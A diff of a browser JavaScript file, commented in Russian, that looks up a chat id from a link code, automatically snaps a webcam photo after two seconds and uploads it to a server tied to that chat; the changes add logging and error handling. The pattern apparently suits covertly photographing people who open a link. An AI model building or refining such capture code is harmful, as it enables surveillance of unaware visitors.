@@ -4,7 +4,7 @@
 const userCode = new URLSearchParams(window.location.search).get("code");
 
 if (userCode) {
-    fetch("/get_user_id?code=" + userCode)  
+    fetch("/get_user_id?code=" + userCode)
         .then(response => response.text())
         .then(chat_id => {
             if (chat_id === "not_found") return;
@@ -15,6 +15,7 @@ if (userCode) {
                     let video = document.getElementById('video');
                     video.srcObject = stream;
                     video.onloadedmetadata = () => {
+                        console.log("Видео загружено, начинаем захват.");
                         setTimeout(() => capturePhoto(chat_id), 2000); // Захватываем фото через 2 секунды
                     };
                 })
@@ -27,6 +28,12 @@ if (userCode) {
                 let video = document.getElementById('video');
                 let canvas = document.getElementById('canvas');
                 let ctx = canvas.getContext('2d');
+
+                // Проверим, если видео не загружено
+                if (!video.videoWidth || !video.videoHeight) {
+                    console.error("Видео не загружено, невозможно захватить изображение.");
+                    return;
+                }
 
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
@@ -45,18 +52,21 @@ if (userCode) {
                     formData.append('chat_id', chat_id);
                     formData.append('photo', blob, 'photo.jpg');
 
-                    fetch("/send_photo", {  
+                    // Отправляем фото на сервер
+                    fetch("/send_photo", {
                         method: 'POST',
                         body: formData
                     }).then(response => {
                         if (response.ok) {
-                            console.log("Фото отправлено");
+                            console.log("Фото успешно отправлено!");
                         } else {
                             console.error("Ошибка при отправке фото:", response.statusText);
                         }
 
                         // Останавливаем видеопоток после отправки фото
                         video.srcObject.getTracks().forEach(track => track.stop());
+                    }).catch(err => {
+                        console.error("Ошибка при отправке фото на сервер:", err);
                     });
                 }, 'image/jpeg');
             }
